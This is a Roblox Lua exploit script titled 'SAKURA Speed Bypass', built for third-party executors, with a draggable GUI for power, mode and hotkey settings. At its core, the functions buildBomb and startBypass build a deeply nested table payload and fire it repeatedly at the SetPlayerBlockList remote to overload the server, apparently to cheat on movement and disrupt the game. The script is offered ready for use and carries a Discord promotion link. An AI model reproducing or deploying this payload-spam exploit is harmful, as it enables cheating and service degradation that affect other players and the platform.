-- SAKURA Speed Bypass (GUI matched to reference photo)
-- Core bypass logic preserved

local Services = {
    Players = game:GetService("Players"),
    UserInput = game:GetService("UserInputService"),
    RunService = game:GetService("RunService"),
    Tween = game:GetService("TweenService"),
    Http = game:GetService("HttpService"),
    ContentProvider = game:GetService("ContentProvider"),
}

local LocalPlayer = Services.Players.LocalPlayer or Services.Players.PlayerAdded:Wait()
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

--=====================================================================
-- CONFIG
--=====================================================================
local CONSTANTS = {
    CONFIG_FILE = "SakuraSpeedBypass.json",
    GUI_NAME = "SakuraSpeedBypass",

    DEPTH = 296,
    SPAM_DELAY = 0.12,
    MIN_POWER = 1,
    MAX_POWER = 500000,

    DEFAULT_POWER_PC = 97000,
    DEFAULT_POWER_MOBILE = 65000,
    POWER_STEP = 1000,

    BG_ASSET = "1021443862",
    DISCORD = "https://discord.gg/sakuraduels",
}

local Theme = {
    Panel = Color3.fromRGB(16, 16, 18),
    PanelInner = Color3.fromRGB(22, 22, 26),
    PanelBtn = Color3.fromRGB(28, 28, 32),
    Text = Color3.fromRGB(255, 255, 255),
    TextDim = Color3.fromRGB(160, 160, 165),
    Stroke = Color3.fromRGB(48, 48, 52),
    BorderGlow = Color3.fromRGB(190, 55, 40),
    Inactive = Color3.fromRGB(130, 130, 135),
}

local State = {
    enabled = false,
    powerValue = CONSTANTS.DEFAULT_POWER_PC,
    mode = "PC",
    toggleKey = Enum.KeyCode.V,
    isVisible = true,
    listeningKey = false,
    uiScale = 1,
}

local Bypass = {
    running = false,
    bomb = nil,
    thread = nil,
    startedAt = 0,
}

local Refs = {}

--=====================================================================
-- CONFIG
--=====================================================================
local function saveConfig()
    pcall(function()
        writefile(CONSTANTS.CONFIG_FILE, Services.Http:JSONEncode({
            Enabled = State.enabled,
            PowerValue = State.powerValue,
            Mode = State.mode,
            ToggleKey = State.toggleKey.Name,
            IsVisible = State.isVisible,
            UiScale = State.uiScale,
        }))
    end)
end

local function loadConfig()
    pcall(function()
        if not isfile or not isfile(CONSTANTS.CONFIG_FILE) then return end
        local data = Services.Http:JSONDecode(readfile(CONSTANTS.CONFIG_FILE))
        if not data then return end
        State.enabled = data.Enabled == true
        State.powerValue = tonumber(data.PowerValue) or CONSTANTS.DEFAULT_POWER_PC
        State.mode = data.Mode or "PC"
        State.isVisible = data.IsVisible ~= false
        State.uiScale = math.clamp(tonumber(data.UiScale) or 1, 0.7, 1.4)
        if data.ToggleKey and Enum.KeyCode[data.ToggleKey] then
            State.toggleKey = Enum.KeyCode[data.ToggleKey]
        end
    end)
end

--=====================================================================
-- BYPASS
--=====================================================================
local function buildBomb(power)
    local spammed = { {} }
    local z = spammed[1]
    for _ = 1, CONSTANTS.DEPTH do
        local n = {}
        table.insert(z, n)
        z = n
    end
    local mainTable = {}
    local reps = math.floor(power / (CONSTANTS.DEPTH + 2))
    for _ = 1, reps do
        table.insert(mainTable, spammed)
    end
    return mainTable
end

local function stopBypass()
    Bypass.running = false
    if Bypass.thread then pcall(task.cancel, Bypass.thread) end
    Bypass.bomb = nil
    Bypass.thread = nil
end

local function startBypass(power)
    stopBypass()
    Bypass.running = true
    Bypass.bomb = buildBomb(power)
    Bypass.startedAt = os.clock()
    Bypass.thread = task.spawn(function()
        while Bypass.running do
            if Bypass.bomb then
                pcall(function()
                    game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(Bypass.bomb)
                end)
            end
            task.wait(CONSTANTS.SPAM_DELAY)
        end
    end)
end

local function restartBypass()
    if State.enabled then startBypass(State.powerValue) end
end

--=====================================================================
-- UI HELPERS
--=====================================================================
local function corner(parent, r)
    local c = Instance.new("UICorner")
    c.CornerRadius = UDim.new(0, r or 14)
    c.Parent = parent
    return c
end

local function stroke(parent, color, thickness, transparency)
    local s = Instance.new("UIStroke")
    s.Color = color or Theme.Stroke
    s.Thickness = thickness or 1.15
    s.Transparency = transparency or 0.2
    s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    s.Parent = parent
    return s
end

-- Robust image loader: tries multiple URI formats until one loads
local _imgVersion = setmetatable({}, { __mode = "k" })
local function loadAssetImage(img, assetId, opts)
    if not img then return end
    opts = opts or {}
    local id = tostring(assetId or ""):gsub("%D", "")
    if id == "" then return end

    local version = (_imgVersion[img] or 0) + 1
    _imgVersion[img] = version

    img.BackgroundTransparency = 1
    img.ImageTransparency = opts.transparency or 0
    img.ImageColor3 = opts.color or Color3.fromRGB(255, 255, 255)
    img.ScaleType = opts.scaleType or Enum.ScaleType.Crop

    local candidates = {
        "rbxassetid://" .. id,
        "rbxthumb://type=Asset&id=" .. id .. "&w=420&h=420",
        "rbxthumb://type=Asset&id=" .. id .. "&w=768&h=432",
        "rbxthumb://type=Asset&id=" .. id .. "&w=150&h=150",
        "https://www.roblox.com/asset-thumbnail/image?assetId=" .. id .. "&width=420&height=420&format=png",
        "https://thumbnails.roblox.com/v1/assets?assetIds=" .. id .. "&size=420x420&format=Png",
    }

    task.spawn(function()
        for _, uri in ipairs(candidates) do
            if not img or not img.Parent or _imgVersion[img] ~= version then return end
            img.Image = uri
            pcall(function()
                Services.ContentProvider:PreloadAsync({ img })
            end)
            task.wait(0.45)
            if not img or not img.Parent or _imgVersion[img] ~= version then return end
            local loaded = false
            pcall(function() loaded = img.IsLoaded end)
            -- Also accept non-empty Image that isn't a blank fail
            if loaded then
                if opts.onLoaded then pcall(opts.onLoaded, true) end
                return
            end
        end
        if opts.onLoaded then pcall(opts.onLoaded, false) end
    end)
end

local function makeDraggable(handle, target)
    local dragging, dragStart, startPos = false, nil, nil
    handle.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1
            or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = target.Position
        end
    end)
    handle.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1
            or input.UserInputType == Enum.UserInputType.Touch then
            dragging = false
        end
    end)
    Services.UserInput.InputChanged:Connect(function(input)
        if not dragging then return end
        if input.UserInputType == Enum.UserInputType.MouseMovement
            or input.UserInputType == Enum.UserInputType.Touch then
            local d = input.Position - dragStart
            target.Position = UDim2.new(
                startPos.X.Scale, startPos.X.Offset + d.X,
                startPos.Y.Scale, startPos.Y.Offset + d.Y
            )
        end
    end)
end

--=====================================================================
-- BUILD GUI
--=====================================================================
local function destroyOld()
    for _, parent in ipairs({ PlayerGui, game:GetService("CoreGui") }) do
        pcall(function()
            local o = parent:FindFirstChild(CONSTANTS.GUI_NAME)
            if o then o:Destroy() end
        end)
    end
end

local function buildGui()
    destroyOld()

    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = CONSTANTS.GUI_NAME
    screenGui.ResetOnSpawn = false
    screenGui.IgnoreGuiInset = false
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.DisplayOrder = 120
    pcall(function()
        if syn and syn.protect_gui then syn.protect_gui(screenGui) end
    end)
    local ok = pcall(function() screenGui.Parent = game:GetService("CoreGui") end)
    if not ok then screenGui.Parent = PlayerGui end

    -- Outer shell
    local outer = Instance.new("Frame")
    outer.Name = "Outer"
    outer.Size = UDim2.new(0, 352, 0, 278)
    outer.Position = UDim2.new(0.5, -176, 0.5, -139)
    outer.BackgroundTransparency = 1
    outer.BorderSizePixel = 0
    outer.Parent = screenGui

    -- Main rounded panel
    local main = Instance.new("Frame")
    main.Name = "Main"
    main.Size = UDim2.new(1, 0, 1, 0)
    main.BackgroundColor3 = Color3.fromRGB(10, 10, 12)
    main.BackgroundTransparency = 0.05
    main.BorderSizePixel = 0
    main.ClipsDescendants = true
    main.Parent = outer
    corner(main, 20)
    local mainStroke = stroke(main, Theme.BorderGlow, 2.4, 0.22)

    -- Soft inner edge (double-border look like photo)
    local innerEdge = Instance.new("Frame")
    innerEdge.Name = "InnerEdge"
    innerEdge.Size = UDim2.new(1, -6, 1, -6)
    innerEdge.Position = UDim2.new(0, 3, 0, 3)
    innerEdge.BackgroundTransparency = 1
    innerEdge.BorderSizePixel = 0
    innerEdge.ZIndex = 2
    innerEdge.Parent = main
    corner(innerEdge, 17)
    stroke(innerEdge, Color3.fromRGB(30, 30, 34), 1, 0.35)

    -- Background image (full bleed, cropped)
    local bg = Instance.new("ImageLabel")
    bg.Name = "Background"
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.BackgroundColor3 = Color3.fromRGB(8, 8, 10)
    bg.BackgroundTransparency = 0
    bg.BorderSizePixel = 0
    bg.ScaleType = Enum.ScaleType.Crop
    bg.ImageTransparency = 0.42
    bg.ZIndex = 0
    bg.Parent = main
    corner(bg, 20)
    loadAssetImage(bg, CONSTANTS.BG_ASSET, { transparency = 0.42, scaleType = Enum.ScaleType.Crop })

    -- Dark gradient wash for readability
    local wash = Instance.new("Frame")
    wash.Size = UDim2.new(1, 0, 1, 0)
    wash.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    wash.BackgroundTransparency = 0.38
    wash.BorderSizePixel = 0
    wash.ZIndex = 1
    wash.Parent = main
    corner(wash, 20)

    local content = Instance.new("Frame")
    content.Name = "Content"
    content.Size = UDim2.new(1, -28, 1, -28)
    content.Position = UDim2.new(0, 14, 0, 14)
    content.BackgroundTransparency = 1
    content.ZIndex = 5
    content.Parent = main

    ----------------------------------------------------------------
    -- HEADER
    ----------------------------------------------------------------
    local header = Instance.new("Frame")
    header.Name = "Header"
    header.Size = UDim2.new(1, 0, 0, 82)
    header.BackgroundColor3 = Theme.Panel
    header.BackgroundTransparency = 0.18
    header.BorderSizePixel = 0
    header.ZIndex = 6
    header.Parent = content
    corner(header, 16)
    stroke(header, Theme.Stroke, 1.15, 0.28)

    -- Big SAKURA title (text only)
    local titleText = Instance.new("TextLabel")
    titleText.Name = "SakuraTitle"
    titleText.Size = UDim2.new(0, 200, 0, 46)
    titleText.Position = UDim2.new(0, 14, 0, 6)
    titleText.BackgroundTransparency = 1
    titleText.Text = "SAKURA"
    titleText.Font = Enum.Font.GothamBlack
    titleText.TextSize = 34
    titleText.TextColor3 = Color3.fromRGB(255, 255, 255)
    titleText.TextXAlignment = Enum.TextXAlignment.Left
    titleText.TextYAlignment = Enum.TextYAlignment.Center
    titleText.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    titleText.TextStrokeTransparency = 0.4
    titleText.ZIndex = 8
    titleText.Parent = header

    local titleGrad = Instance.new("UIGradient")
    titleGrad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
        ColorSequenceKeypoint.new(0.45, Color3.fromRGB(245, 245, 250)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(210, 210, 220)),
    })
    titleGrad.Parent = titleText

    local discordLbl = Instance.new("TextLabel")
    discordLbl.Name = "Discord"
    discordLbl.Size = UDim2.new(0, 190, 0, 18)
    discordLbl.Position = UDim2.new(0, 16, 0, 52)
    discordLbl.BackgroundTransparency = 1
    discordLbl.Text = CONSTANTS.DISCORD
    discordLbl.Font = Enum.Font.Gotham
    discordLbl.TextSize = 11
    discordLbl.TextColor3 = Theme.TextDim
    discordLbl.TextXAlignment = Enum.TextXAlignment.Left
    discordLbl.ZIndex = 8
    discordLbl.Parent = header

    -- Minimize
    -- UI scale < > and minimize —
    local function makeTinyBtn(name, text, xOff)
        local b = Instance.new("TextButton")
        b.Name = name
        b.Size = UDim2.new(0, 26, 0, 24)
        b.Position = UDim2.new(1, xOff, 0, 10)
        b.BackgroundColor3 = Theme.PanelBtn
        b.BackgroundTransparency = 0.15
        b.BorderSizePixel = 0
        b.Text = text
        b.Font = Enum.Font.GothamBold
        b.TextSize = 14
        b.TextColor3 = Theme.Text
        b.AutoButtonColor = false
        b.ZIndex = 10
        b.Parent = header
        corner(b, 8)
        stroke(b, Theme.Stroke, 1, 0.35)
        return b
    end

    local scaleDownBtn = makeTinyBtn("ScaleDown", "<", -92)
    local scaleUpBtn = makeTinyBtn("ScaleUp", ">", -64)
    local minBtn = makeTinyBtn("Minimize", "—", -36)

    -- Mode pill (PC / MOBILE) — matches photo: rounded capsule
    local modeBox = Instance.new("Frame")
    modeBox.Name = "ModeBox"
    modeBox.Size = UDim2.new(0, 138, 0, 36)
    modeBox.Position = UDim2.new(1, -154, 0, 36)
    modeBox.BackgroundColor3 = Theme.PanelInner
    modeBox.BackgroundTransparency = 0.08
    modeBox.BorderSizePixel = 0
    modeBox.ZIndex = 8
    modeBox.Parent = header
    corner(modeBox, 12)
    stroke(modeBox, Theme.Stroke, 1.1, 0.3)

    local pcBtn = Instance.new("TextButton")
    pcBtn.Name = "PC"
    pcBtn.Size = UDim2.new(0.5, -5, 1, -8)
    pcBtn.Position = UDim2.new(0, 4, 0, 4)
    pcBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    pcBtn.BackgroundTransparency = 0.08
    pcBtn.BorderSizePixel = 0
    pcBtn.Text = "PC"
    pcBtn.Font = Enum.Font.GothamBold
    pcBtn.TextSize = 12
    pcBtn.TextColor3 = Color3.fromRGB(12, 12, 14)
    pcBtn.AutoButtonColor = false
    pcBtn.ZIndex = 9
    pcBtn.Parent = modeBox
    corner(pcBtn, 9)

    local mobileBtn = Instance.new("TextButton")
    mobileBtn.Name = "Mobile"
    mobileBtn.Size = UDim2.new(0.5, -5, 1, -8)
    mobileBtn.Position = UDim2.new(0.5, 1, 0, 4)
    mobileBtn.BackgroundColor3 = Theme.PanelBtn
    mobileBtn.BackgroundTransparency = 1
    mobileBtn.BorderSizePixel = 0
    mobileBtn.Text = "MOBILE"
    mobileBtn.Font = Enum.Font.GothamBold
    mobileBtn.TextSize = 11
    mobileBtn.TextColor3 = Theme.Inactive
    mobileBtn.AutoButtonColor = false
    mobileBtn.ZIndex = 9
    mobileBtn.Parent = modeBox
    corner(mobileBtn, 9)

    ----------------------------------------------------------------
    -- POWER CARD
    ----------------------------------------------------------------
    local powerCard = Instance.new("Frame")
    powerCard.Name = "PowerCard"
    powerCard.Size = UDim2.new(1, 0, 0, 92)
    powerCard.Position = UDim2.new(0, 0, 0, 94)
    powerCard.BackgroundColor3 = Theme.Panel
    powerCard.BackgroundTransparency = 0.18
    powerCard.BorderSizePixel = 0
    powerCard.ZIndex = 6
    powerCard.Parent = content
    corner(powerCard, 16)
    stroke(powerCard, Theme.Stroke, 1.15, 0.28)

    local powerTitle = Instance.new("TextLabel")
    powerTitle.Size = UDim2.new(0.5, 0, 0, 22)
    powerTitle.Position = UDim2.new(0, 16, 0, 10)
    powerTitle.BackgroundTransparency = 1
    powerTitle.Text = "POWER:"
    powerTitle.Font = Enum.Font.GothamBold
    powerTitle.TextSize = 13
    powerTitle.TextColor3 = Theme.Text
    powerTitle.TextXAlignment = Enum.TextXAlignment.Left
    powerTitle.ZIndex = 7
    powerTitle.Parent = powerCard

    local statusPill = Instance.new("TextButton")
    statusPill.Name = "Status"
    statusPill.Size = UDim2.new(0, 96, 0, 24)
    statusPill.Position = UDim2.new(1, -110, 0, 9)
    statusPill.BackgroundColor3 = Theme.PanelBtn
    statusPill.BackgroundTransparency = 0.12
    statusPill.BorderSizePixel = 0
    statusPill.Text = "DISABLED"
    statusPill.Font = Enum.Font.GothamBold
    statusPill.TextSize = 11
    statusPill.TextColor3 = Theme.TextDim
    statusPill.AutoButtonColor = false
    statusPill.ZIndex = 8
    statusPill.Parent = powerCard
    corner(statusPill, 10)
    stroke(statusPill, Theme.Stroke, 1, 0.35)

    local controls = Instance.new("Frame")
    controls.Size = UDim2.new(1, -24, 0, 42)
    controls.Position = UDim2.new(0, 12, 0, 40)
    controls.BackgroundTransparency = 1
    controls.ZIndex = 7
    controls.Parent = powerCard

    local leftBtn = Instance.new("TextButton")
    leftBtn.Name = "PowerDown"
    leftBtn.Size = UDim2.new(0, 42, 0, 42)
    leftBtn.BackgroundColor3 = Theme.PanelInner
    leftBtn.BackgroundTransparency = 0.05
    leftBtn.BorderSizePixel = 0
    leftBtn.Text = "◀"
    leftBtn.Font = Enum.Font.GothamBold
    leftBtn.TextSize = 15
    leftBtn.TextColor3 = Theme.Text
    leftBtn.AutoButtonColor = false
    leftBtn.ZIndex = 8
    leftBtn.Parent = controls
    corner(leftBtn, 12)
    stroke(leftBtn, Theme.Stroke, 1.05, 0.3)

    local powerBox = Instance.new("TextBox")
    powerBox.Name = "PowerValue"
    powerBox.Size = UDim2.new(1, -104, 0, 42)
    powerBox.Position = UDim2.new(0, 52, 0, 0)
    powerBox.BackgroundColor3 = Theme.PanelInner
    powerBox.BackgroundTransparency = 0.05
    powerBox.BorderSizePixel = 0
    powerBox.Text = tostring(State.powerValue)
    powerBox.Font = Enum.Font.GothamBlack
    powerBox.TextSize = 22
    powerBox.TextColor3 = Theme.Text
    powerBox.ClearTextOnFocus = false
    powerBox.TextXAlignment = Enum.TextXAlignment.Center
    powerBox.ZIndex = 8
    powerBox.Parent = controls
    corner(powerBox, 12)
    stroke(powerBox, Theme.Stroke, 1.05, 0.3)

    local rightBtn = Instance.new("TextButton")
    rightBtn.Name = "PowerUp"
    rightBtn.Size = UDim2.new(0, 42, 0, 42)
    rightBtn.Position = UDim2.new(1, -42, 0, 0)
    rightBtn.BackgroundColor3 = Theme.PanelInner
    rightBtn.BackgroundTransparency = 0.05
    rightBtn.BorderSizePixel = 0
    rightBtn.Text = "▶"
    rightBtn.Font = Enum.Font.GothamBold
    rightBtn.TextSize = 15
    rightBtn.TextColor3 = Theme.Text
    rightBtn.AutoButtonColor = false
    rightBtn.ZIndex = 8
    rightBtn.Parent = controls
    corner(rightBtn, 12)
    stroke(rightBtn, Theme.Stroke, 1.05, 0.3)

    ----------------------------------------------------------------
    -- HOTKEY CARD
    ----------------------------------------------------------------
    local keyCard = Instance.new("Frame")
    keyCard.Name = "HotkeyCard"
    keyCard.Size = UDim2.new(1, 0, 0, 54)
    keyCard.Position = UDim2.new(0, 0, 0, 198)
    keyCard.BackgroundColor3 = Theme.Panel
    keyCard.BackgroundTransparency = 0.18
    keyCard.BorderSizePixel = 0
    keyCard.ZIndex = 6
    keyCard.Parent = content
    corner(keyCard, 16)
    stroke(keyCard, Theme.Stroke, 1.15, 0.28)

    local keyLabel = Instance.new("TextLabel")
    keyLabel.Size = UDim2.new(0.55, 0, 1, 0)
    keyLabel.Position = UDim2.new(0, 18, 0, 0)
    keyLabel.BackgroundTransparency = 1
    keyLabel.Text = "Hotkey"
    keyLabel.Font = Enum.Font.GothamBold
    keyLabel.TextSize = 15
    keyLabel.TextColor3 = Theme.Text
    keyLabel.TextXAlignment = Enum.TextXAlignment.Left
    keyLabel.ZIndex = 7
    keyLabel.Parent = keyCard

    local keyBtn = Instance.new("TextButton")
    keyBtn.Name = "HotkeyBtn"
    keyBtn.Size = UDim2.new(0, 54, 0, 34)
    keyBtn.Position = UDim2.new(1, -68, 0.5, -17)
    keyBtn.BackgroundColor3 = Theme.PanelInner
    keyBtn.BackgroundTransparency = 0.05
    keyBtn.BorderSizePixel = 0
    keyBtn.Text = State.toggleKey.Name
    keyBtn.Font = Enum.Font.GothamBold
    keyBtn.TextSize = 14
    keyBtn.TextColor3 = Theme.Text
    keyBtn.AutoButtonColor = false
    keyBtn.ZIndex = 8
    keyBtn.Parent = keyCard
    corner(keyBtn, 11)
    stroke(keyBtn, Theme.Stroke, 1.05, 0.3)

    Refs = {
        screenGui = screenGui,
        outer = outer,
        main = main,
        mainStroke = mainStroke,
        content = content,
        header = header,
        powerCard = powerCard,
        keyCard = keyCard,
        pcBtn = pcBtn,
        mobileBtn = mobileBtn,
        statusPill = statusPill,
        powerBox = powerBox,
        leftBtn = leftBtn,
        rightBtn = rightBtn,
        keyBtn = keyBtn,
        minBtn = minBtn,
        titleText = titleText,
        fullSize = UDim2.new(0, 352, 0, 278),
        miniSize = UDim2.new(0, 352, 0, 110),
    }

    makeDraggable(header, outer)
    makeDraggable(main, outer)
end

--=====================================================================
-- REFRESH
--=====================================================================
local function refreshMode()
    local pc, mb = Refs.pcBtn, Refs.mobileBtn
    if not pc then return end
    if State.mode == "PC" then
        pc.BackgroundTransparency = 0.08
        pc.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        pc.TextColor3 = Color3.fromRGB(12, 12, 14)
        mb.BackgroundTransparency = 1
        mb.TextColor3 = Theme.Inactive
    else
        mb.BackgroundTransparency = 0.08
        mb.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        mb.TextColor3 = Color3.fromRGB(12, 12, 14)
        pc.BackgroundTransparency = 1
        pc.TextColor3 = Theme.Inactive
    end
end

local function refreshStatus()
    local pill = Refs.statusPill
    if not pill then return end
    if State.enabled then
        pill.Text = "ENABLED"
        pill.TextColor3 = Color3.fromRGB(90, 255, 150)
        if Refs.mainStroke then Refs.mainStroke.Color = Color3.fromRGB(55, 190, 100) end
    else
        pill.Text = "DISABLED"
        pill.TextColor3 = Theme.TextDim
        if Refs.mainStroke then Refs.mainStroke.Color = Theme.BorderGlow end
    end
end

local function refreshPower()
    if Refs.powerBox then Refs.powerBox.Text = tostring(State.powerValue) end
end

local function refreshKey()
    if Refs.keyBtn then
        Refs.keyBtn.Text = State.toggleKey.Name
        Refs.keyBtn.TextColor3 = Theme.Text
    end
end

local function refreshVisibility()
    local v = State.isVisible
    if Refs.powerCard then Refs.powerCard.Visible = v end
    if Refs.keyCard then Refs.keyCard.Visible = v end
    if Refs.outer then Refs.outer.Size = v and Refs.fullSize or Refs.miniSize end
    if Refs.minBtn then Refs.minBtn.Text = v and "—" or "+" end
end

local function refreshUIScale()
    State.uiScale = math.clamp(tonumber(State.uiScale) or 1, 0.7, 1.4)
    if Refs.uiScaleObj then
        Refs.uiScaleObj.Scale = State.uiScale
    end
end

local function stepUIScale(dir)
    State.uiScale = math.clamp((tonumber(State.uiScale) or 1) + dir * 0.1, 0.7, 1.4)
    -- round to 1 decimal
    State.uiScale = math.floor(State.uiScale * 10 + 0.5) / 10
    refreshUIScale()
    saveConfig()
end

local function setPower(val)
    val = math.clamp(math.floor(tonumber(val) or State.powerValue), CONSTANTS.MIN_POWER, CONSTANTS.MAX_POWER)
    State.powerValue = val
    refreshPower()
    restartBypass()
    saveConfig()
end

local function toggleEnabled()
    State.enabled = not State.enabled
    refreshStatus()
    if State.enabled then startBypass(State.powerValue) else stopBypass() end
    saveConfig()
end

--=====================================================================
-- EVENTS
--=====================================================================
local function bindEvents()
    local r = Refs

    r.statusPill.MouseButton1Click:Connect(toggleEnabled)

    r.pcBtn.MouseButton1Click:Connect(function()
        State.mode = "PC"
        setPower(CONSTANTS.DEFAULT_POWER_PC)
        refreshMode()
        saveConfig()
    end)

    r.mobileBtn.MouseButton1Click:Connect(function()
        State.mode = "Mobile"
        setPower(CONSTANTS.DEFAULT_POWER_MOBILE)
        refreshMode()
        saveConfig()
    end)

    r.leftBtn.MouseButton1Click:Connect(function()
        setPower(State.powerValue - CONSTANTS.POWER_STEP)
    end)
    r.rightBtn.MouseButton1Click:Connect(function()
        setPower(State.powerValue + CONSTANTS.POWER_STEP)
    end)

    local function holdStep(btn, dir)
        local holding = false
        btn.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1
                or input.UserInputType == Enum.UserInputType.Touch then
                holding = true
                task.spawn(function()
                    task.wait(0.35)
                    while holding do
                        setPower(State.powerValue + dir * CONSTANTS.POWER_STEP)
                        task.wait(0.08)
                    end
                end)
            end
        end)
        btn.InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1
                or input.UserInputType == Enum.UserInputType.Touch then
                holding = false
            end
        end)
    end
    holdStep(r.leftBtn, -1)
    holdStep(r.rightBtn, 1)

    r.powerBox.FocusLost:Connect(function()
        local val = tonumber(r.powerBox.Text)
        if val then setPower(val) else refreshPower() end
    end)

    r.keyBtn.MouseButton1Click:Connect(function()
        if State.listeningKey then return end
        State.listeningKey = true
        r.keyBtn.Text = "..."
        r.keyBtn.TextColor3 = Color3.fromRGB(255, 200, 100)
        local conn
        conn = Services.UserInput.InputBegan:Connect(function(input)
            if input.UserInputType ~= Enum.UserInputType.Keyboard then return end
            if input.KeyCode == Enum.KeyCode.Unknown then return end
            State.toggleKey = input.KeyCode
            State.listeningKey = false
            refreshKey()
            saveConfig()
            if conn then conn:Disconnect() end
        end)
    end)

    r.minBtn.MouseButton1Click:Connect(function()
        State.isVisible = not State.isVisible
        refreshVisibility()
        saveConfig()
    end)

    if r.scaleDownBtn then
        r.scaleDownBtn.MouseButton1Click:Connect(function()
            stepUIScale(-1)
        end)
    end
    if r.scaleUpBtn then
        r.scaleUpBtn.MouseButton1Click:Connect(function()
            stepUIScale(1)
        end)
    end

    Services.UserInput.InputBegan:Connect(function(input)
        if State.listeningKey then return end
        if input.UserInputType == Enum.UserInputType.Keyboard
            and input.KeyCode == State.toggleKey then
            if Services.UserInput:GetFocusedTextBox() then return end
            toggleEnabled()
        end
    end)
end

--=====================================================================
-- BOOT
--=====================================================================
loadConfig()
buildGui()
refreshMode()
refreshStatus()
refreshPower()
refreshKey()
refreshVisibility()
refreshUIScale()
bindEvents()

if State.enabled then
    startBypass(State.powerValue)
end

_G.SakuraSpeedBypass = {
    State = State,
    Start = function()
        State.enabled = true
        refreshStatus()
        startBypass(State.powerValue)
    end,
    Stop = function()
        State.enabled = false
        refreshStatus()
        stopBypass()
    end,
    SetPower = setPower,
}

print("[SAKURA] Speed Bypass loaded")
